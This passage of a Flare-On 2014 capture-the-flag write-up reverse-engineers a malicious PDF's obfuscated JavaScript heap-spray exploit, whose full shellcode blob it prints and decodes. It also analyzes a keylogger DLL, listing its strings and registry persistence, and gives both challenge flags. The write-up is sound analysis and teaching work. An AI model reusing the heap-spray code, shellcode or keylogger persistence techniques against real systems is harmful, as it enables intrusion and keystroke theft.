%u2372%u3610%ud29f%u7168%ufa44%u81ff%u2f72%ua9f7%u0ca9%u8468%ucfe9%u8160%u3b72%u93be%u43a9%ud268%u98a3%u8137%u4772%u8a82%u3b62%uef68%u11a4%u814b%u5372%u47d6%uccc0%ube68%ua469%u81ff%u5f72%ucaa3%u3154%ud468%u65ab%u8b52%u57cc%u5153%u8b57%u89f1%u83f7%u1ec7%ufe39%u0b7d%u3681%u4542%u4645%uc683%ueb04%ufff1%u68d0%u7365%u0173%udf8b%u5c88%u0324%u5068%u6f72%u6863%u7845%u7469%uff54%u2474%uff40%u2454%u5740%ud0ff");
 \n    var MPBPtdcBjTlpvyTYkSwgkrWhXL = "";
 \n\n    for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=128;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA>=0;--EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA) MPBPtdcBjTlpvyTYkSwgkrWhXL += unescape("%ub32f%u3791");\n    ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv = MPBPtdcBjTlpvyTYkSwgkrWhXL + IxTUQnOvHg;
 \n    OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY = unescape("%ub32f%u3791");
 \n    fJWhwERSDZtaZXlhcREfhZjCCVqFAPS = 20;
 \n    fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA = fJWhwERSDZtaZXlhcREfhZjCCVqFAPS+ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv.length\n    while (OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length<fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA) OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY+=OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY;
 \n    UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb = OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(0, fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);
 \n    MOysyGgYplwyZzNdETHwkru = OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(0, OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length-fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);
 \n    while(MOysyGgYplwyZzNdETHwkru.length+fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA < 0x40000) MOysyGgYplwyZzNdETHwkru = MOysyGgYplwyZzNdETHwkru+MOysyGgYplwyZzNdETHwkru+UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb;
 \n    DPwxazRhwbQGu = new Array();
 \n    for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=0;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA<100;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA++) DPwxazRhwbQGu[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA] = MOysyGgYplwyZzNdETHwkru + ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv;
 \n\n    for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=142;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA>=0;--EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA) zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf += unescape("%ub550%u0166");
 \n    bGtvKT = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length + 20\n    while (zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length < bGtvKT) zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf += zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;
 \n    Juphd = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(0, bGtvKT);
 \n    QCZabMzxQiD = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(0, zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length-bGtvKT);
 \n    while(QCZabMzxQiD.length+bGtvKT < 0x40000) QCZabMzxQiD = QCZabMzxQiD+QCZabMzxQiD+Juphd;
 \n    FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE = new Array();
 \n    for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=0;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA<125;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA++) FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA] = QCZabMzxQiD + zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;\n'
$
```

We see unicode blob passed as an argument to `unescape` method. Let's extract and analyze it. Once extracted we will need to clean and convert it to hex:

```python
$ ipython
>>>
>>> import re
>>> import binascii
>>>
>>> sc = "%u72f9%u4649%u1525%u7f0d%u3d3c%ue084%ud62a%ue139%ua84a%u76b9%u9824%u7378%u7d71%u757f%u2076%u96d4%uba91%u1970%ub8f9%ue232%u467b%u9ba8%ufe01%uc7c6%ue3c1%u7e24%u437c%ue180%ub115%ub3b2%u4f66%u27b6%u9f3c%u7a4e%u412d%ubbbf%u7705%uf528%u9293%u9990%ua998%u0a47%u14eb%u3d49%u484b%u372f%ub98d%u3478%u0bb4%ud5d2%ue031%u3572%ud610%u6740%u2bbe%u4afd%u041c%u3f97%ufc3a%u7479%u421d%ub7b5%u0c2c%u130d%u25f8%u76b0%u4e79%u7bb1%u0c66%u2dbb%u911c%ua92f%ub82c%u8db0%u0d7e%u3b96%u49d4%ud56b%u03b7%ue1f7%u467d%u77b9%u3d42%u111d%u67e0%u4b92%ueb85%u2471%u9b48%uf902%u4f15%u04ba%ue300%u8727%u9fd6%u4770%u187a%u73e2%ufd1b%u2574%u437c%u4190%u97b6%u1499%u783c%u8337%ub3f8%u7235%u693f%u98f5%u7fbe%u4a75%ub493%ub5a8%u21bf%ufcd0%u3440%u057b%ub2b2%u7c71%u814e%u22e1%u04eb%u884a%u2ce2%u492d%u8d42%u75b3%uf523%u727f%ufc0b%u0197%ud3f7%u90f9%u41be%ua81c%u7d25%ub135%u7978%uf80a%ufd32%u769b%u921d%ubbb4%u77b8%u707e%u4073%u0c7a%ud689%u2491%u1446%u9fba%uc087%u0dd4%u4bb0%ub62f%ue381%u0574%u3fb9%u1b67%u93d5%u8396%u66e0%u47b5%u98b7%u153c%ua934%u3748%u3d27%u4f75%u8cbf%u43e2%ub899%u3873%u7deb%u257a%uf985%ubb8d%u7f91%u9667%ub292%u4879%u4a3c%ud433%u97a9%u377e%ub347%u933d%u0524%u9f3f%ue139%u3571%u23b4%ua8d6%u8814%uf8d1%u4272%u76ba%ufd08%ube41%ub54b%u150d%u4377%u1174%u78e3%ue020%u041c%u40bf%ud510%ub727%u70b1%uf52b%u222f%u4efc%u989b%u901d%ub62c%u4f7c%u342d%u0c66%ub099%u7b49%u787a%u7f7e%u7d73%ub946%ub091%u928d%u90bf%u21b7%ue0f6%u134b%u29f5%u67eb%u2577%ue186%u2a05%u66d6%ua8b9%u1535%u4296%u3498%ub199%ub4ba%ub52c%uf812%u4f93%u7b76%u3079%ubefd%u3f71%u4e40%u7cb3%u2775%ue209%u4324%u0c70%u182d%u02e3%u4af9%ubb47%u41b6%u729f%u9748%ud480%ud528%u749b%u1c3c%ufc84%u497d%u7eb8%ud26b%u1de0%u0d76%u3174%u14eb%u3770%u71a9%u723d%ub246%u2f78%u047f%ub6a9%u1c7b%u3a73%u3ce1%u19be%u34f9%ud500%u037a%ue2f8%ub024%ufd4e%u3d79%u7596%u9b15%u7c49%ub42f%u9f4f%u4799%uc13b%ue3d0%u4014%u903f%u41bf%u4397%ub88d%ub548%u0d77%u4ab2%u2d93%u9267%ub198%ufc1a%ud4b9%ub32c%ubaf5%u690c%u91d6%u04a8%u1dbb%u4666%u2505%u35b7%u3742%u4b27%ufc90%ud233%u30b2%uff64%u5a32%u528b%u8b0c%u1452%u728b%u3328%ub1c9%u3318%u33ff%uacc0%u613c%u027c%u202c%ucfc1%u030d%ue2f8%u81f0%u5bff%u4abc%u8b6a%u105a%u128b%uda75%u538b%u033c%uffd3%u3472%u528b%u0378%u8bd3%u2072%uf303%uc933%uad41%uc303%u3881%u6547%u5074%uf475%u7881%u7204%u636f%u7541%u81eb%u0878%u6464%u6572%ue275%u8b49%u2472%uf303%u8b66%u4e0c%u728b%u031c%u8bf3%u8e14%ud303%u3352%u57ff%u6168%u7972%u6841%u694c%u7262%u4c68%u616f%u5464%uff53%u68d2%u3233%u0101%u8966%u247c%u6802%u7375%u7265%uff54%u68d0%u786f%u0141%udf8b%u5c88%u0324%u6168%u6567%u6842%u654d%u7373%u5054%u54ff%u2c24%u6857%u2144%u2121%u4f68%u4e57%u8b45%ue8dc%u0000%u0000%u148b%u8124%u0b72%ua316%u32fb%u7968%ubece%u8132%u1772%u45ae%u48cf%uc168%ue12b%u812b%u2372%u3610%ud29f%u7168%ufa44%u81ff%u2f72%ua9f7%u0ca9%u8468%ucfe9%u8160%u3b72%u93be%u43a9%ud268%u98a3%u8137%u4772%u8a82%u3b62%uef68%u11a4%u814b%u5372%u47d6%uccc0%ube68%ua469%u81ff%u5f72%ucaa3%u3154%ud468%u65ab%u8b52%u57cc%u5153%u8b57%u89f1%u83f7%u1ec7%ufe39%u0b7d%u3681%u4542%u4645%uc683%ueb04%ufff1%u68d0%u7365%u0173%udf8b%u5c88%u0324%u5068%u6f72%u6863%u7845%u7469%uff54%u2474%uff40%u2454%u5740%ud0ff"
>>>
>>> with open("shellcode.binary", "wb") as fo:
...   fo.write(binascii.unhexlify(re.sub(r"%u(..)(..)", r"\2\1", sc)))
...
>>>
```

The extracted binary shellcode blob contains references to Windows APIs and some strings:

```
$ cat shellcode.binary | hd
00000000  f9 72 49 46 25 15 0d 7f  3c 3d 84 e0 2a d6 39 e1  |.rIF%...<=..*.9.|
00000010  4a a8 b9 76 24 98 78 73  71 7d 7f 75 76 20 d4 96  |J..v$.xsq}.uv ..|
00000020  91 ba 70 19 f9 b8 32 e2  7b 46 a8 9b 01 fe c6 c7  |..p...2.{F......|
00000030  c1 e3 24 7e 7c 43 80 e1  15 b1 b2 b3 66 4f b6 27  |..$~|C......fO.'|
00000040  3c 9f 4e 7a 2d 41 bf bb  05 77 28 f5 93 92 90 99  |<.Nz-A...w(.....|
00000050  98 a9 47 0a eb 14 49 3d  4b 48 2f 37 8d b9 78 34  |..G...I=KH/7..x4|
00000060  b4 0b d2 d5 31 e0 72 35  10 d6 40 67 be 2b fd 4a  |....1.r5..@g.+.J|
...<snip>...
000002c0  75 da 8b 53 3c 03 d3 ff  72 34 8b 52 78 03 d3 8b  |u..S<...r4.Rx...|
000002d0  72 20 03 f3 33 c9 41 ad  03 c3 81 38 47 65 74 50  |r ..3.A....8GetP|
000002e0  75 f4 81 78 04 72 6f 63  41 75 eb 81 78 08 64 64  |u..x.rocAu..x.dd|
000002f0  72 65 75 e2 49 8b 72 24  03 f3 66 8b 0c 4e 8b 72  |reu.I.r$..f..N.r|
00000300  1c 03 f3 8b 14 8e 03 d3  52 33 ff 57 68 61 72 79  |........R3.Whary|
00000310  41 68 4c 69 62 72 68 4c  6f 61 64 54 53 ff d2 68  |AhLibrhLoadTS..h|
00000320  33 32 01 01 66 89 7c 24  02 68 75 73 65 72 54 ff  |32..f.|$.huserT.|
00000330  d0 68 6f 78 41 01 8b df  88 5c 24 03 68 61 67 65  |.hoxA....\$.hage|
00000340  42 68 4d 65 73 73 54 50  ff 54 24 2c 57 68 44 21  |BhMessTP.T$,WhD!|
00000350  21 21 68 4f 57 4e 45 8b  dc e8 00 00 00 00 8b 14  |!!hOWNE.........|
00000360  24 81 72 0b 16 a3 fb 32  68 79 ce be 32 81 72 17  |$.r....2hy..2.r.|
00000370  ae 45 cf 48 68 c1 2b e1  2b 81 72 23 10 36 9f d2  |.E.Hh.+.+.r#.6..|
00000380  68 71 44 fa ff 81 72 2f  f7 a9 a9 0c 68 84 e9 cf  |hqD...r/....h...|
00000390  60 81 72 3b be 93 a9 43  68 d2 a3 98 37 81 72 47  |`.r;...Ch...7.rG|
000003a0  82 8a 62 3b 68 ef a4 11  4b 81 72 53 d6 47 c0 cc  |..b;h...K.rS.G..|
000003b0  68 be 69 a4 ff 81 72 5f  a3 ca 54 31 68 d4 ab 65  |h.i...r_..T1h..e|
000003c0  52 8b cc 57 53 51 57 8b  f1 89 f7 83 c7 1e 39 fe  |R..WSQW.......9.|
000003d0  7d 0b 81 36 42 45 45 46  83 c6 04 eb f1 ff d0 68  |}..6BEEF.......h|
000003e0  65 73 73 01 8b df 88 5c  24 03 68 50 72 6f 63 68  |ess....\$.hProch|
000003f0  45 78 69 74 54 ff 74 24  40 ff 54 24 40 57 ff d0  |ExitT.t$@.T$@W..|
00000400
```

I tried disassembling and analyzing it but got nowhere:

```objdump
$ cat shellcode.binary | udcli
0000000000000000 f9               stc
0000000000000001 7249             jb 0x4c
0000000000000003 46               inc esi
0000000000000004 25150d7f3c       and eax, 0x3c7f0d15
0000000000000009 3d84e02ad6       cmp eax, 0xd62ae084
000000000000000e 39e1             cmp ecx, esp
0000000000000010 4a               dec edx
...<snip>...
00000000000003c3 57               push edi
00000000000003c4 53               push ebx
00000000000003c5 51               push ecx
00000000000003c6 57               push edi
00000000000003c7 8bf1             mov esi, ecx
00000000000003c9 89f7             mov edi, esi
00000000000003cb 83c71e           add edi, 0x1e
00000000000003ce 39fe             cmp esi, edi
00000000000003d0 7d0b             jge 0x3dd
00000000000003d2 813642454546     xor dword [esi], 0x46454542
00000000000003d8 83c604           add esi, 0x4
00000000000003db ebf1             jmp 0x3ce
00000000000003dd ffd0             call eax
00000000000003df 6865737301       push 0x1737365
00000000000003e4 8bdf             mov ebx, edi
00000000000003e6 885c2403         mov [esp+0x3], bl
00000000000003ea 6850726f63       push 0x636f7250
00000000000003ef 6845786974       push 0x74697845
00000000000003f4 54               push esp
00000000000003f5 ff742440         push dword [esp+0x40]
00000000000003f9 ff542440         call dword [esp+0x40]
00000000000003fd 57               push edi
00000000000003fe ffd0             call eax
$
```

This is where the [writeup](http://www.ghettoforensics.com/2014/09/a-walkthrough-for-flare-re-challenges.html) from [@bbaskin](https://twitter.com/bbaskin) proved useful once again! I installed the recommended [shellcode2exe.py](https://github.com/MarioVilas/shellcode_tools/blob/master/shellcode2exe.py) tool and converted the shellcode blob to an EXE file:

```
$ shellcode2exe.py shellcode.binary
Shellcode to executable converter
by Mario Vilas (mvilas at gmail dot com)

Reading raw shellcode from file shellcode.binary
Generating executable file
Writing file shellcode.exe
Done.
$
$ ls -l shellcode.*
-rw-rw-r-- 1 shiv shiv 1024 Feb 18 16:48 shellcode.binary
-rw-rw-r-- 1 shiv shiv 6656 Feb 18 17:03 shellcode.exe
-rw-rw-rw- 1 shiv shiv 3072 Feb 16 11:09 shellcode.unicode
$
```

While analyzing this file using Ollydbg, the email is decoded and placed right in front :)

![image](/static/files/posts_flareon2014_15/flareon2014-c4-1.png.webp)

So, the flag for this challenge is: `wa1ch.d3m.spl01ts@flare-on.com`

### Challenge #5
Alright, on to the final challenge for this post. This is a binary file and let's gather some information about it:

```
$ file 5get_it
5get_it: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
$
$ strings 5get_it
!This program cannot be run in DOS mode.
YRich
.text
`.rdata
@.data
.reloc
...<snip>...
svchost.log
[SHIFT]
[RETURN]
[BACKSPACE]
[TAB]
[CTRL]
[DELETE]
[CAPS LOCK]
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
svchost
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
svchost
ConsoleWindowClass
GetModuleHandle returned %d
c:\windows\system32\svchost.dll
c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll
UTF-8
UTF-16LE
...<snip>...
>8>D>`>
?0?P?\?x?
080X0x0
90;4;8;<;@;D;H;L;P;T;`;d;h;l;p;t;x;|;
< <$<(<,<0<4<8<<<@<D<H<L<P<T<X<\<`<d<h<l<p<t<x<|<
< =0=@=P=`=
4 4$4(4,4044484@4
$
```

This is a DLL that has interesting strings referring some keyboard and registry keys. Also referenced is a Windows API, `GetAsyncKeyState` that is commonly used within keyloggers to know whether a key is pressed or not. I tried analyzing this file through IDA and it proved quite useful. Upon loading the file you will find that there are references to a large number of variables that check if a certain key is pressed or not. I traced through the cross-references of all these variable and eventually found the flag:

![image](/static/files/posts_flareon2014_15/flareon2014-c5-1.png.webp)

As can be seen from the screenshot above, all these variable check if certain keys are pressed in sequence. The keys to be pressed and the order they have to be pressed is the flag: `l0gging.ur.5tr0ke5@flare-on.com`
